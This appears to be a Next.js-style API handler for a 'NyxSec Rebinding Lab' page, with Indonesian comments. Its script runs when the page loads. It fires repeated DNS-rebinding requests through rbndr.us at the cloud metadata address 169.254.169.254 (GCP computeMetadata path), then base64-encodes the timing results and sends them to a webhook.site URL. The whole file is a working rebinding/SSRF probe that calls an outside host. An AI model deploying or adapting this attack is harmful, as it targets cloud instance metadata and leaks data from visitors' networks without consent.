export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>NyxSec Rebinding Lab</title></head>
      <body>
        <pre>Status: Initiating DNS Rebinding Attack...</pre>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
          const rebindDomain = "http://01010101.a9fea9fe.rbndr.us/computeMetadata/v1/instance/hostname";

          async function attemptRebind(id) {
            const start = Date.now();
            return new Promise((resolve) => {
              const img = new Image();
              const timer = setTimeout(() => {
                resolve({ id, time: Date.now() - start, status: "timeout" });
              }, 3000);

              img.onload = img.onerror = () => {
                clearTimeout(timer);
                resolve({ id, time: Date.now() - start, status: "finished" });
              };

              // Memaksa resolusi DNS baru dengan parameter acak
              img.src = rebindDomain + "?cache=" + Math.random();
            });
          }

          async function runTest() {
            const results = [];
            // Melakukan 10 percobaan cepat untuk memicu rotasi DNS rbndr.us
            for(let i=0; i<10; i++) {
              results.push(await attemptRebind(i));
            }

            fetch(webhook + "?rebind_results=" + btoa(JSON.stringify(results)));
          }

          runTest();
        </script>
      </body>
    </html>
  `);
}
